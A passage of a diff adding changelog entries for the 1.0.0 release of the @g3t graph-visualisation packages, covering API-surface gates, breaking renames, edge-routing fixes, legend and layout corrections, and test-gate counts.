+  by `scripts/build-landing.mjs` (`verify:landing`), which reads the
+  titles and the dev/prod visibility gate from `DemoLanding.tsx`,
+  cross-checks every id against `Demo.tsx`'s `SHELL_MAP` in both
+  directions, and fails on a rename rather than emitting a quietly
+  short list. It also states the dev/prod difference, which was
+  documented nowhere a visitor could see it. The same gate fails on a
+  `blob/main/` link naming a path that is not in the repo, which is how
+  the footer's 404 shipped. The Quick Start gained the stylesheet
+  import it omitted, the one line whose absence renders every view
+  unstyled with no error and no warning, and it is now typechecked:
+  `check-readme-snippets.mjs` reads `<pre data-snippet="tsx">` blocks
+  out of the landing page alongside the markdown fences.
+
+## 1.0.0 (continued): 2026-08-14 (public surface)
+
+- **The published runtime API surface is now a golden file.** Every
+  exports-map entry of all three packages is enumerated into
+  `api-surface.json` and any difference fails `verify:surface`. Every
+  gate before it checked the surface one-directionally (declared entries
+  exist, dist is a superset of the source barrel, each subpath imports
+  non-empty), so the namespace could only ever widen and nothing could
+  notice a symbol ARRIVING. 22 entries, 514 runtime exports.
+- **BREAKING, `@g3t/react`: `LayoutOptions` is now `LayoutPanelOptions`.**
+  The name collided with `@g3t/core`'s `LayoutOptions` on the same entry
+  point while meaning something different: core's is what the layout
+  engines accept, react's was the LayoutManager panel's UI state. Code
+  that imported the react type and passed it to `ForceLayout.compute()`
+  type-checked cleanly and silently discarded every force-tuning field.
+  `@g3t/react` now re-exports core's `LayoutOptions` alongside the
+  engines it already re-exports, so that name means the engines' bag.
+- **BREAKING, `@g3t/charts`: `@g3t/core` and `@g3t/react` moved from
+  dependencies to peerDependencies.** As regular dependencies, npm and
+  yarn could resolve a SECOND copy of `@g3t/react` under charts. That is
+  not just duplication: `@g3t/react` ships the Zustand stores that are
+  one of the three declared integration channels, and two module
+  instances means two store singletons, so a chart writes to a store the
+  host never subscribed to. No error, no stack trace, just a chart that
+  will not respond to selection.
+- **BREAKING, `@g3t/core`: nine subpath-reachable helpers reviewed, six
+  moved or removed.** `estimateTextSize` and `buildStructuralElkGraph`
+  stay public and now carry the reason in their jsdoc. The four SHACL
+  row-label formatters (`propertyRowText`, `cardinalitySuffix`,
+  `valueConstraintCount`, `severityOverlayId`) moved to a new
+  `@g3t/core/internal` subpath that is shipped and importable but
+  explicitly outside the semver contract: they encode a rendering
+  opinion, and freezing `[0..*]` notation under 1.0 is the wrong trade.
+  `localPart` and `castLiteral` are off the public surface entirely
+  (generic RDF plumbing, still used inside core).
+- **CI runs on every branch.** `push` was filtered to main with no PR
+  open, so this long-lived branch accumulated gate regressions with
+  nothing to catch them: an unformatted file failed `lint` across
+  several commits. A concurrency group cancels superseded runs to bound
+  the added cost.
+- `planning/g3l/prf-budgets.json` restored to tracking. A commit that
+  gitignored `planning/archive/` untracked it, and `tests/perf` reads it
+  with a bare `readFileSync` and no fallback, so the perf job crashed on
+  this branch only.
+- Docs: `capabilities-and-limits.md` said the incremental-layout symbols
+  are exported from `@g3t/core`. All four are on `@g3t/core/layout`.
+
+## 1.0.0 (continued): register of 2026-08-06 (R-15, R-16, R-17)
+
+- **R-16, generalised as asked**: the editor gated size and nothing
+  else, so a structural target was offered a shape selector whose
+  every choice did nothing. Both renderers now declare what they
+  can APPLY (`STRUCTURAL_STYLE_CHANNELS`, `CANVAS_STYLE_CHANNELS`),
+  the editor gates every control and every write on that set, and
+  `channels` overrides it per call. Auditing for this found the
+  same over-promise one layer down: `StructuralNodeStyle` declared
+  `icon` and `labelField`, the applier emitted them, and the view
+  applied neither. Both are removed from the type and the applier
+  rather than left as fields nothing reads.
+- **R-17**: `FloatingLegend` takes the `elements` descriptor and an
+  optional `ugm`, matching `SpecLegend`, so a floating legend works
+  over a structural scene without the consumer positioning the
+  inner component itself.
+- **R-15, and the gate they asked for instead of the fix**:
+  `SvgViewTransform` was declared, used as the type of a documented
+  prop, and not re-exported. Their diagnosis (that the export gate
+  checks value exports more thoroughly than type exports) was
+  right, so `verify:typeref` now checks that every type named in a
+  public `*Props` interface is nameable from the entry, following
+  `export *` chains so re-exports do not read as failures. It found
+  three more instances beyond the reported one:
+  `NodeStyleTarget`, `LegendElement`, and
+  `CanvasInteractionOptions`. All four are exported; 52 prop
+  interfaces now pass.
+- Gates: core 431, react 738, charts 20, demo 184, examples 60
+  = 1,433 tests exit-0; verify chain (now including type
+  reachability), spec gate, e2e 68/14, statics green.
+
+## 1.0.0 (continued): R-12 and R-13 in full (round 21)
+
+The full text arrived; all four R-12 parts and the remaining R-13
+item are implemented.
+
+- **12a structural applier**: `overridesToStructuralStyles` is the
+  renderer-neutral counterpart of `overridesToCytoscapeStyles`,
+  and `StructuralSvgView` takes `nodeStyles` as a PROP rather than
+  subscribing to the store, keeping the view pure and letting a
+  consumer scope overrides per surface. Precedence is stated and
+  implemented: rowSeverities beats overrides beats theme, because
+  a violation tint is a correctness signal and an override is a
+  preference. Size is deliberately not resolved by the applier.
+- **12b renderer-neutral editor**: `NodeStyleEditor` takes a
+  `target` descriptor ({ id, type, label, current, isPie }), with
+  the ugm/nodeId form kept as the convenience overload. The editor
+  now works on any graph a host has not loaded into a UGM, which
+  helps the canvas case too.
+- **12c size ownership: THEIR OPTION 2, changing my provisional
+  answer.** The scoping note had proposed option 3 (canvas-only);
+  their argument that they own and rebuild the geometry document
+  on every scene change is better, and option 2 composes with
+  everything. A size change on a structural target is REPORTED via
+  `onGeometryChange` rather than written into a presentational
+  override. Option 3 remains as the fallback: with no handler
+  wired the control is suppressed with an explanation instead of
+  being offered inert.
+- **12d arrangement out of the view**: `dragOffsets` is
+  controllable with `onDragOffsetsChange`, following the R-9 view
+  precedent, plus `onNodeMove(id, dx, dy)` for hosts that mutate
+  their own geometry. Persistence deliberately not built: the
+  model is plain serialisable data, as the request notes.
+- **R-13.3 one legend for both renderers**: `SpecLegend`'s `ugm`
+  is optional and it accepts `elements` descriptors, the same
+  shape as the editor target. `ResolveContext.ugm` became optional
+  with an honest fallback: an auto domain without data yields a
+  neutral unit range rather than a guess, so a structural caller
+  states its domain.
+- **Export defect found while writing the handoff**:
+  relayoutAroundFixed, useElementPointerEvents, and
+  defaultClickDragThreshold were implemented, tested, AND
+  documented, but never re-exported from the package entry, so a
+  consumer following the documented R-7 recipe could not import
+  the function it names. Now exported and covered by the entry
+  gate. Found by verifying every symbol a handoff document was
+  about to cite, which is the check that should have run when
+  each landed.
+- Budgets: core 154 to 155.5 KB, react 384.5 to 386 KB, with
+  rationale.
+- Gates: core 431, react 733, charts 20, demo 184, examples 60
+  = 1,428 tests exit-0; verify chain, spec gate, e2e 68/14,
+  statics green.
+
+## 1.0.0 (continued): the 2026-08-05 register
+
+Four of five open requests closed; R-12 scoped rather than
+started. The consumer's re-measurement confirms the earlier R-4
+fix on real data: 34 of 34 views differ between anchorings, total
+bends 900 to 826, no view worse.
+
+- **R-10 (my defect)**: the glyph affordance added for navigation
+  STARTED A CANVAS PAN, so pressing it dragged the scene. Silent
+  with a mouse, constant with a finger. Affordance zones now start
+  neither a node drag nor a pan, behind a named predicate so
+  future affordance zones extend in one place.
+  `clickDragThreshold` is forwarded from `StructuralSvgView`, and
+  **the model-unit threshold was my design error and is
+  reversed**: tap slop belongs to the input device, so the
+  comparison is in SCREEN pixels. Model units got zoom-invariance
+  backwards (at k = 0.5 a 5px wobble measured 10 units and killed
+  the tap). Defaults resolve per gesture from pointerType: 4px
+  fine, 12px coarse.
+- **R-9**: both offered options implemented. Pointers are tracked
+  by id and two of them pinch about the gesture midpoint through
+  the same `zoomAbout` transform the wheel uses; the second finger
+  cancels any pan or node drag the first began. The transform is
+  exported as `SvgViewTransform` and controllable via `view` and
+  `onViewChange`, which also closes saved-viewport restoration.
+  The wheel now reads deltaY's MAGNITUDE, so zoom is proportional
+  rather than notched. Pointer capture is guarded (jsdom and some
+  engines lack it on SVG: a latent mid-gesture throw).
+- **R-11**: compartment rows carry glyphs from the same map,
+  right-aligned in the row band, reporting `zone: "glyph"` with
+  the row's own id. `GlyphSlot` gains `"row"`. One navigation rule
+  now reaches container contents.
+- **R-13, correctness half**: `overriddenNodeIds` and
+  `overrideScopeSummary` exported (type scopes resolve through the
+  graph); `SpecLegend` accepts `overrides` and `onResetOverrides`
+  and discloses active overrides instead of continuing to assert a
+  rule the reader has locally broken. `FloatingLegend` forwards
+  both. The structural-legend half sequences with R-12.
+- **R-12**: scoped in planning/g3l/r12-scoping.md rather than
+  guessed at; its full text did not arrive with the register. The
+  provisional answer on the size question is that a size override
+  should be REFUSED on structural scenes rather than silently
+  ignored, since geometry is layout input and changing it
+  post-layout either invalidates routes or discards the reader's
+  arrangement.
+- React budget 379.5 to 384.5 KB with rationale.
+- Gates: core 428, react 727, charts 20, demo 184, examples 60
+  = 1,419 tests exit-0; verify chain, spec gate, e2e parse 68/14,
+  statics green.
+
+## 1.0.0 (continued): the consolidated upstream register
+
+Folded into the 1.0.0 entry below rather than filed as 1.0.1: the
+tag has not been cut, so these are release content, not a patch on
+top of a release. The R-4 finding in particular must not ship as
+1.0.0 behavior.
+
+### R-4 as shipped in 1.0.0 was a NO-OP (found from a consumer measurement)
+
+A consumer reported that `anchor: "source"` and `anchor: "target"`
+produced identical routes across 34 real views. Verified here and
+worse than reported: 0 of 9 routes differed even in a dense
+complete-bipartite fixture, so the option did nothing anywhere.
+
+Root cause: the second pass only SORTED by the far end's assigned
+coordinate. In a layered scene the far boxes never overlap on the
+cross axis, so that sort reproduces the plain center order and the
+modes coincide by construction.
+
+Compounding it: the 1.0.0 oracle for this option did not
+discriminate. It passed under `anchor: "source"` too, which is how
+a no-op shipped as a feature. Verified directly rather than
+assumed.
+
+Fixed: target-first now ALIGNS each departure with the arrival
+already fixed at the far end, clamped into the side's span with a
+forward/backward spread pass so saturated anchors cannot collapse
+onto the boundary. The replacement oracle asserts a real
+behavioral difference, a lower bend count, and distinct
+departures, so this cannot silently regress to a no-op. Measured
+on the dense fixture: 18 bends to 14.
+
+### A latent CI flake, surfaced by that work
+
+Adding a test to the layered suite broke the unrelated "emission
+is deterministic to the byte" assertion. That test compares two
+runs of an ANYTIME layout whose crossing-minimization and network
+simplex both stop on a WALL-CLOCK budget, so a differently-loaded
+machine legitimately stops at a different sweep; it would have
+flaked on any busy CI runner. The budgets are pinned in that test
+now, so it asserts algorithmic determinism as intended.
+
+### Register requests, all four closed
+
+- **R-5**: `glyphs` and `headerLines` were CONTAINER-ONLY, so a
+  scene rendered inconsistently by node shape, and a consumer
+  following this project's own guidance to navigate from
+  `zone: "glyph"` silently lost navigation on every node without
+  compartments. Plain nodes now draw glyphs (inside their own
+  corner, having no header strip) and honour `headerLines={2}`,
+  reporting identically to containers. Render and hit test share
+  one band constant so they cannot drift.
+- **R-6**: `g3tLayoutStructural` forwards `anchor` to its router,
+  making the R-4 work reachable from the single call most
+  consumers make.
+- **R-7**: `relayoutAroundFixed(cy, { fixed })` settles neighbours
+  around a moved container: locks the user-placed elements and
+  their descendants, re-runs the layout incrementally, restores
+  the prior lock state including locks the host set itself. The
+  request offered a documentation statement instead; for a toolkit
+  with draggable containers that was the wrong answer.
+- **R-8**: the shape control is suppressed for multi-type (pie)
+  nodes with an inline explanation, and the write path refuses to
+  emit a shape override for them, so the editor can no longer
+  produce two shapes at once.
+- Docs: Pattern 1 states that header features apply to plain
+  nodes; the consumption guide documents the relayout helper.
+- Budgets: core 153.5 to 154 KB, react 376 to 379.5 KB, both with
+  inline rationale.
+- Gates: core 428, react 714, charts 20, demo 184, examples 60
+  = 1,406 tests exit-0; verify chain, spec gate, e2e parse 68/14,
+  statics green.
+
+## 1.0.0 (release)
+
+First stable release. From this version the published surface
+follows semantic versioning: breaking changes to exported
+components, props, and core types require a major bump.
+
+Release-readiness work in this round (audit findings, not
+features):
+
+- **The documented first line for consumers did not typecheck.**
+  `import "@g3t/react/style.css"` failed under node16/nodenext
+  resolution (TS2882, no declaration for a side-effect import).
+  The package now ships a typed CSS entry (types condition +
+  style.css.d.ts in files[]). The README snippet gate caught this
+  the moment the line was added to the quickstart, which is what
+  that gate is for.
+- **Consumers had no install path at all.** The README documented
+  monorepo development commands only, and neither it nor the
+  wiring guide mentioned the stylesheet import: the exact upstream
+  P1 that cost a downstream team two review rounds. Added an
+  Install section (packages, peers, stylesheet) and
+  docs/consuming-g3t.md covering what types cannot express: which
+  props re-run layout, the interaction contracts (click
+  suppression, hit zones, init-time-only options), the
+  _color/_shape styling escape hatch and the stylesheet merge
+  order, the vendored-tarball override recipe, and the known
+  limitations (typed CJS, static vis-* peers).
+- **New release gate**: verify:package checks that every entry
+  point in every publishable package's main/module/types/exports
+  actually EXISTS after a build, and that files[] covers what it
+  claims. 77 entry points verified. This complements verify:types
+  (which already gates declaration RESOLUTION under node16 and
+  bundler; the round-61 upstream report that declarations were
+  unemitted is stale and now provably so).
+- **Stability and deprecation policy** stated in the README:
+  CytoscapeCanvas's `structural` prop ships deprecated (use
+  StructuralSvgView) and warns once in development; layout pixel
+  positions, route shape beyond documented invariants, and deep
+  imports past the exports map are explicitly outside the
+  stability promise.
+- README's component count replaced with a non-brittle
+  description (the "12 views + 15 controls" claim had gone stale).
+- Version bumped 1.0.0-rc.2 to 1.0.0 across the workspace;
+  lockfile refreshed.
+
+## G3L Round 66: the round-17 upstream requests (all four adopted)
+
+- **R-1 (a real bug, P1 correctly)**: useElementPointerEvents
+  dispatched onElementClick unconditionally, so a pan starting
+  over an element fired a click on release. It now records the
+  pointer-down MODEL point and suppresses clicks that travelled
+  past clickDragThreshold (default 4 model units; 0 restores the
+  old behavior). Model space so the threshold is zoom-invariant.
+  Four oracles including the synthetic-click case. This mattered
+  more than its report suggests: the SVG view became the DEFAULT
+  structural renderer last round.
+- **R-2 glyph slots**: StructuralSvgView takes a glyphs map
+  (slot, text, title), drawn as a bordered box in the header
+  strip with class g3t-ssv-glyph plus data hooks; StructuralHit
+  gains zone "glyph" and glyphSlot; GlyphSlot exported from core.
+  The VIEW supplies a glyphAt probe to hitTestStructural rather
+  than core duplicating glyph layout, and glyphs test above the
+  border band so edge-adjacent glyphs stay reachable.
+- **R-3 two-line headers**: headerLines 1 | 2; at 2 the
+  stereotype gets its own centred line above the name. Default
+  leaves existing scenes unchanged.
+- **R-4 target-anchored routing, adopted with a CORRECTED
+  diagnosis**: their premise (edges routed without knowing how
+  many arrive at a side) is not what the code does: the fan pass
+  is global and already spreads both ends before routing, and an
+  oracle now pins non-stacking under both modes. The real
+  residual was the ordering INPUT: each end sorted by the other
+  node's CENTER, so on many-to-one flow every source sorted
+  against the same point. anchor?: "source" | "target" now picks
+  which end resolves first; target-first orders source departures
+  by the ALREADY-ASSIGNED arrival, giving exactly the requested
+  property. Oracle: four sources arrive in their own order (no
+  crossing at the sink). Default preserves existing scenes.
+- Their declaration-gap note accepted: it argues for the queued
+  d.ts round AND for an interaction-contracts document, since
+  what suppresses a click and what hit zones mean cannot be
+  expressed by types. Contracts documented in-source meanwhile.
+- React budget 372.5 -> 376 KB with rationale.
+- Gates: core 426, react 705, charts 20, demo 184, examples 60
+  = 1,395 tests exit-0; budgets, spec gate, e2e parse 68/14,
+  statics green.
+
+## G3L Round 65b: the round-6 upstream report, dispositioned and adopted
+
+- Full verdicts appended to upstream-recs-2026-07-28.md. Two items
+  were ALREADY RESOLVED post-round61 (FloatingLegend now delegates
+  to SpecLegend wholesale; the :active overlay already ships at
+  0.08 opacity): dispositioned as documentation, no code.
+- **The prop-identity relayout report found a REAL current gap**:
+  stylesheet identity was already ref-isolated, but the
+  containment prop sat RAW in the init deps: a host rebuilding it
+  per render re-initialized the canvas and discarded arranged
+  positions (their exact snap-back symptom). containment is now
+  CONTENT-KEYED like layoutOptions, and the relayout contract is
+  documented on the props (content changes to ugm/containment/
+  layout/layoutOptions/interactionOptions/edgeStyle/animate
+  re-init; stylesheet and encodingSpec are style refreshes).
+- **Multi-type promoted to the library**: stampMultiTypePies +
+  MULTI_TYPE_PIE_RULES + MAX_SLICES exported from @g3t/react; the
+  demo module re-exports (consumers stop copying it verbatim).
+- **Compound verification matrix** (headless half):
+  compound-interactions.test.tsx pins parent nesting from
+  edge-type containment, cxttap targeting children not parents,
+  per-element selection without parent bleed, and sibling edges
+  surviving conversion; child drag stays with the e2e layer.
+- **TreeView onSelect** and **inspector titleAccessory** adopted
+  as specified.
+- React budget 372 -> 372.5 KB with rationale.
+- Gates: core 424, react 699, charts 20, demo 184, examples 60
+  = 1,387 tests exit-0; budgets, spec gate, e2e parse 68/14,
+  statics green.
+
+## G3L Round 65: the three architecture directives (2026-07-28)
+
+- **Directive 1, cytoscape-structural DEPRECATED**: the MBSE
+  shell's default renderer was still "cytoscape" with SVG labeled
+  "preview": flipped (SVG default, cytoscape labeled deprecated
+  as the temporary escape hatch); the canvas's structural prop
+  carries @deprecated JSDoc plus a one-time dev warning pointing
+  at StructuralSvgView. The shell tests' scene contract now
+  observes the SVG path (renderer-independent intent); the MBSE
+  measuring host gained the jsdom ResizeObserver guard the shapes
+  host already had. NOTE: the drag-route FLICKER filed last round
+  lives in the deprecated path's attachment code: the SVG default
+  (full live re-route per drag) may dissolve it; owner re-check
+  before any stickiness work.
+- **Directive 2, congestion sizing (first increment)**: derived
+  box sizes now honor per-side attachment demand: declared ports
+  are EXACT (E/W ports stretch height, N/S ports width, pitch 20
+  + margin 24) and box-edge fans get a degree-based floor
+  (ceil(degree/2) on the cross extent). Two oracles: a six-spoke
+  hub grows past its declared height; five WEST ports force 124.
+  The side-exact two-pass (grow after side assignment) remains
+  available as a follow-up if the floor under-provisions in
+  practice.
+- **Directive 3, the patterns catalog**: docs/structural-patterns.md
+  names five supported recipes (flat blocks; containment; blocks
+  with ports; containment WITH ports: the requested combined
+  recipe; mixed port/box bindings) with the behaviors the toolkit
+  GUARANTEES for each, and every guarantee is EXECUTABLE:
+  structural-patterns.test.ts runs each recipe end-to-end
+  (layout + route) and asserts the invariants, so pattern
+  regressions fail CI, not reviews.
+- Core budget 152.5 -> 153.5 KB (congestion sizing), inline
+  rationale.
+- Gates: core 424, react 695, charts 20, demo 184, examples 60
+  = 1,383 tests exit-0; budgets, spec gate, e2e parse 68/14,
+  statics green.
+
+## G3L Round 64e: the owner's walk findings, led by MY 64b regression
+
+- **Supply broken by the 64b guard (mine, root-caused from the
+  owner's console line)**: the guard classified elements as edges
+  by the PRESENCE of data.source, but ugmToCytoscapeElements
+  spreads node PROPERTIES into data, and supply facilities carry
+  a provenance property named "source" (fac.munich:
+  source=Logistics). The node was misclassified, excluded from
+  the node-id set, dropped as a "dangling edge", and its real
+  edges dropped with it. Headless repro confirmed the exact
+  console line. Fix: the guard is an exported pure function
+  (validateAssembledElements) keyed on cytoscape's canonical
+  `group` field (the converter already stamps it), with the
+  source+target fallback only for group-less view-built inputs.
+  Three oracles, including the exact fac.munich shape.
+- **Legend glyphs (owner screenshot)**: star and barrel had NO
+  branch and fell to the dashed-circle default (the screenshot's
+  mystery icons); both drawn now. The rectangle family grew to
+  the diamond's 11-span.
+- **Matrix square-up v2**: aspect-ratio does not apply to table
+  cells; the square moved to an inner flex div the td wraps.
+- **Stats chart dark mode**: the panel was fully THEME-BLIND (no
+  text colors at all); title, tick labels, axis name, and lines
+  now take theme ink and re-render on theme change.
+- **Parametric port pairs straighten**: converting values to
+  container+port made the bindings PURE port pairs, which the
+  snap excluded by design: my change regressed the verified
+  straightening. Port pairs now snap when the shared line stays
+  WITHIN BOTH PORTS' OWN BODIES (the anchor stays on the port,
+  off-center): ports never leave their declared bodies, and the
+  demo straightens again. Oracle-pinned.
+- **IBD label collisions (owner screenshot)**: port labels own
+  the quadrant above E/W ports and right of N/S ports, so edge
+  labels moved to the OPPOSITE quadrant (below the line on
+  horizontal approaches, left on vertical): disjoint by
+  construction.
+- FILED with mechanism: IBD drag-route FLICKER (candidate faces
+  flap frame-to-frame during drag; the fix is stickiness: bias
+  the previous route's face first per move). Deliberately not
+  rushed into the verified drag path this round.
+- Owner decisions recorded: registry publishing deferred ("not
+  yet"); d.ts emission stays queued behind polish.
+- Core budget 152 -> 152.5 KB (detour helper + port-pair snap,
+  both oracle-pinned), with inline rationale.
+- Gates: core 417, react 695, charts 20, demo 184, examples 60
+  = 1,376 tests exit-0; budgets, spec gate, e2e parse 68/14,
+  statics green.
+
+## G3L Round 64d: G3 analytics fills + end-anchored labels + parametric ports
+
+- **G3, all four mechanisms**: (1) the charts were FIXED at 320px
+  inside flex-sized panes (the old "fill the pane" comment was
+  stale); LinkedChart's height now accepts a CSS length and the
+  dashboard passes 100%. (2) the datagrid clipped columns because
+  width:100% squeezed the table into its narrow host; the table
+  now takes min-width max-content and the pane scrolls
+  horizontally. (3) pageSize 12 -> 16 so the table uses more of
+  the pane's height (still paged). (4) matrix fill mode squares
+  cells UP: aspect-ratio 1/1 so HEIGHT follows the column width,
+  never the reverse.
+- **End-anchored edge labels (the shapes note + the IBD
+  Imagery/Cmd collision)**: labels sat at the polyline's MIDDLE
+  VERTEX, which is a bend on most orthogonal routes and collides
+  where fans converge. They now anchor at the TARGET end, backed
+  off along the final segment with a perpendicular offset and
+  approach-aware text anchoring.
+- **Parametric container + port** (owner suggestion): value
+  properties render as containers with an EAST port; bindings
+  leave the port toward the constraint's WEST params,
+  demonstrating the port-anchored form (and exercising the VR-8
+  mixed-pair straightening in the demo).
+- 1,371 tests exit-0 (core 416, react 692, charts 20, demo 183,
+  examples 60); budgets, spec gate, e2e parse 68/14, statics
+  green.
+
+## G3L Round 64c: the VR-9 through-container fix + G4/G5 + shapes labels
+
+- **VR-9 lead mechanism fixed**: on router failure the fallback
+  surrendered to the obstacle-blind simple template: the IBD
+  screenshots' mid-height edges straight through payload and obc.
+  The fallback now builds a perpendicular DETOUR around the
+  near-obstacle band (out past the band on the cross axis,
+  across, back in; nearer side preferred; straight-simple only
+  when even the detour cannot clear). The helper is exported and
+  unit-tested against a full-height wall; an integration oracle
+  routes the screenshot-shaped port chain and asserts no segment
+  crosses an intermediate container.
+- **G4, both halves**: the neighborhood tab mounts hierarchic
+  (dropdown says so via initialLayout), AND ranks by HOPS:
+  breadthfirst with the selected node as the explicit root layers
+  exactly like the hop count, which is the ranking the owner
+  expected from the class tree comparison.
+- **G5**: the legend rectangle glyph was 10x8 against a
+  10-diameter circle and an 11-span diamond; squared to 10x10
+  (round-rectangle too).
+- **Shapes edge predicates**: the projection labels reference
+  edges with the path's LOCAL NAME (cut at the last of #, /, or
+  dot) instead of the full URI. END-ANCHORED placement remains
+  filed (it is a view-level labeling mode, not a text fix).
+- 1,371 tests exit-0 (core 416, react 692, charts 20, demo 183,
+  examples 60); budgets, spec gate, e2e parse 68/14, statics
+  green.
+
+## G3L Round 64b: the upstream report + the IBD evidence
+
+- Upstream recommendations from the prm-analyzer consumer slice
+  analyzed; full agree/disagree dispositions in
+  planning/g3l/upstream-recs-2026-07-28.md. ADOPTED this round:
+  pre-construction element VALIDATION (dangling edges dropped
+  with a warning instead of a fatal cytoscape constructor error:
+  their P1 churn race); an interactionOptions prop on
+  CytoscapeCanvas (wheelSensitivity/min/maxZoom/panning/box
+  selection, content-keyed into init); NeighborhoodPopout
+  encodingSpec + stylesheet + camera props (their P2 and the
+  owner's VR-24, found independently: the analytics caller now
+  passes its spec so popout shapes match the main graph; fit
+  remains the default camera); TreeView showBreadcrumb (their
+  P3); a dev-only missing-stylesheet warning at first canvas
+  mount (their P1 stylesheet trap: warning adopted, CSS
+  auto-injection deliberately declined for CSP/SSR reasons).
+  FILED with plans: type declaration emission, encoding channels
+  for line style/border, optional-peer isolation for the
+  timeline, the consumption guide, StructuralSvgView fill
+  wrapper, findShortestPath directedness.
+- Lint hygiene adjacent to the touched files: a REAL latent bug
+  in charts (xLabel/yLabel missing from the options memo deps:
+  label prop changes never rebuilt options), stale disable
+  directives cleared.
+- IBD screenshots received and analyzed; VR-9 mechanisms filed:
+  (1) mid-height edges pass THROUGH intermediate containers,
+  consistent with the router failing in dense port corridors and
+  falling back to the unrouted simple template; (2) edge labels
+  at bends collide (Imagery/Cmd), the end-anchored placement
+  item; (3) parallel Power runs share long corridors. The
+  through-container fallback is the round-64c lead.
+- 1,369 tests exit-0 (core 414, react 692, charts 20, demo 183,
+  examples 60); budgets, spec gate, e2e parse 68/14, statics
+  green.
+
+## G3L Round 64a: the 2026-07-28 evening owner batch
+
+- VR-2b (owner-found): leaving Color mode never reverted. Root
+  cause: the spec effect only APPLIED patches; a spec that drops
+  a channel writes nothing, and nothing removed the stale
+  _ecolor, so edge[_ecolor] matched forever. The effect now
+  clears encoding-managed keys (_ecolor/_ewidth; _color/_icon/
+  _size) absent from the new patch; the presentation oracle
+  asserts the revert.
+- VR-2c: the edge color channel had NO legend representation;
+  SpecLegend renders categorical edge-color rows now.
+- VR-27 v2 per ruling: keyword gone; open shapes dashed, closed
+  solid + heavier; oracle updated (asserts dash + no keyword).
+- G1: port labels moved OUTSIDE beside the port with a
+  perpendicular offset clearing the wire (the inside placement
+  sat on container rows).
+- G2: userSelect none on the SVG root; drags no longer sweep
+  text into the selection.
+- VR-29 v2: divider line out, 40px breathing room stays.
+- Toolbar: popover "Run layout" removed (redundant under live
+  apply); Re-run remains the explicit control; the
+  stale-premise test rewritten.
+- VR-17b: axis TICKS to primary ink.
+- FILED for 64b: analytics vertical fills + datagrid overflow +
+  square-up matrix cells (G3); neighborhood default hierarchy +
+  hop-rank investigation (G4); legend rect scale (G5); shapes
+  edge-predicate localName + end-anchored placement; parametric
+  container+port demo model. The IBD screenshots did not arrive
+  with the batch; VR-9 waits.
+- 1,369 tests exit-0 (core 414, react 712, demo 183, examples
+  60; an earlier edition of this entry said 1,370/184: the revert
+  oracle extended an existing test, it did not add one); budgets,
+  spec gate, e2e parse 68/14, statics green.
+
+## G3L Round 63d: VR-8/11/27
+
+- **VR-8**: mixed pairs (one port, one box: the parametric
+  bindings) now straighten: the BOX anchor slides to the declared
+  port's tangent within the snap window (ports stay where
+  declared, the LR-21 principle). Pure port-to-port pairs keep
+  their small centered jog by design: both ends are declared and
+  cannot move. All four MBSE tabs already share one router; this
+  closes the last behavioral asymmetry that CAN close.
+- **VR-11, the real mechanism**: not padding: the 7px/char width
+  ESTIMATE is calibrated safe-high for short strings, so its
+  overshoot vs a proportional font accumulates ABSOLUTELY with
+  text length: requirement sentences gained ~60px of phantom
+  width while short-rowed blocks stayed tight ("padding scales
+  badly"). The estimate now tapers (24 chars at 7px, the
+  remainder at 5.8px), oracle-pinned.
+- **VR-27**: closed shapes now SAY it: the «closed» keyword in
+  the container header (standard notation) on top of the round-61
+  heavier border; the shapes-tab oracle asserts both.
+- 1,369 tests exit-0 (core 414, react 712, demo 183, examples
+  60); budgets, spec gate, e2e parse 68/14, statics green.
+
+## G3L Round 63c: the toolbar investigation (VR-4/5) + VR-18
+
+- **VR-4, the owner's "state propagation" suspicion, confirmed as
+  TWO mechanisms**: (1) sliders only wrote React state; nothing
+  re-ran the layout until an explicit Run or a layout switch, so
+  every option control felt dead. Option edits now apply LIVE
+  with a 300ms debounce, incremental (randomize false) so the
+  mental map holds while a slider drags. (2) hierarchy's mapping
+  consumed rankSeparation only; breadthfirst's single spread knob
+  is now driven by BOTH sliders, normalized so the defaults give
+  factor 1. Two new oracles: debounced-apply reaching fcose's
+  idealEdgeLength with the new value, and hierarchy honoring the
+  slider product.
+- **VR-5**: GraphToolbar gained initialLayout; the ontology
+  Hierarchy tab passes hierarchy (or force when the inferred
+  toggle switches the canvas to fcose, via a remount key), so the
+  dropdown tells the truth about what laid the graph out.
+- **VR-18**: MatrixView fill mode (width 100%, fixed table
+  layout, columns share the width); the analytics rail uses it.
+- 1,367 tests exit-0 (core 412, react 712, demo 183, examples
+  60); budgets, spec gate, e2e parse 68/14, statics green.
+
+## G3L Round 63b: the BDD trio (VR-7d/e/f) + five smalls
+
+- **The trio shared one root, the same flow-vs-side residue the
+  fans had in round 62**: (d) the SIMPLE TEMPLATE branched on the
+  flow axis, handing an E/W pair under DOWN flow a four-bend
+  vertical Z by construction (the owner's exact complaint); it
+  now follows the side pair (horizontal Z / vertical Z /
+  one-corner L for mixed pairs), and near-aligned adjacent pairs
+  collapse to a STRAIGHT line. (e) the LR-21 snap likewise
+  snapped the flow's cross coordinate; now side-relative: E/W
+  pairs snap the shared Y, N/S the shared X: vertical lock works.
+  (f) side selection moved from center deltas to SIGNED BORDER
+  GAPS (subsumes the dominant-axis rule; correct under overlap),
+  with EXPOSURE-AWARE anchoring: anchors slide to an uncovered
+  stretch of their border and fall to the next-best side when the
+  counterpart fully covers a border (the OBC-over-SmallSat drop).
+  Four new oracles pin the complaints verbatim: straight-line
+  collapse, vertical lock, Z ceiling, overlap escape. Core 412.
+- **VR-25 real mechanism**: the timeline's kind column was a 74px
+  grid track under an 88px-min-width chip: the chip OVERFLOWED
+  its track into the name. The round-52 fix widened the chip and
+  never the track; the track is 96px now and carries the gap.
+- **VR-26 + most of VR-10**: shapes port labels derive the local
+  name at the last of #, /, or dot (URI ids have dots in the
+  domain, so the old dot-split popped URI tails); and port labels
+  moved INSIDE their own container (UML convention), which both
+  ends the run-over-adjacent-containers overflow and takes labels
+  off the wire's exit path by construction.
+- **VR-17**: explicit nameTextStyle (primary ink, 12px semibold)
+  on all five chart axes; charts budget 7 -> 7.5 KB with an
+  inline rationale, per the gate's own protocol.
+- **VR-29**: the removed LR-1 header WAS the landing grids'
+  separation; a divider rule with 28px breathing restores it
+  without reintroducing text.
+- 1,365 tests exit-0 (core 412, react 710, demo 183, examples
+  60); budgets, spec gate, e2e parse 68/14, statics green.
+
+## G3L Round 63a: VR-2 root-caused from the owner's browser run
+
+- The owner's failing e2e run received rgb(85,91,99): the DARK
+  THEME's edgeColor. Root cause: themeColorRules pushed AFTER
